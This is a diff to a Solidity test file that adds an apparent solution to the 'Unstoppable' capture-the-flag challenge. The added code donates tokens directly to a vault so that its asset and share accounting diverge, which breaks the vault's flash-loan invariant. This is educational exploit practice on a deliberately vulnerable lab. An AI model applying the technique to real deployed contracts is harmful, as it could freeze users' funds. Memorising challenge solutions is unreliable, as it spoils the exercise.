@@ -91,7 +91,20 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        uint256 sharesBefore = vault.totalSupply();
+        uint256 assetsBefore = vault.totalAssets();
+
+        // 1. Perform direct transfer, so that total assets increases and total supply (shares) remains the same
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE); 
+
+        uint256 sharesAfter = vault.totalSupply();
+        uint256 assetsAfter = vault.totalAssets();
+
+        // 2. Verify - 
+        // 2.a total shares remains the same
+        assert(sharesBefore == sharesAfter);
+        // 2.b total assets increases by INITIAL_PLAYER_TOKEN_BALANCE
+        assert(assetsBefore + INITIAL_PLAYER_TOKEN_BALANCE == assetsAfter);
     }
 
     /**
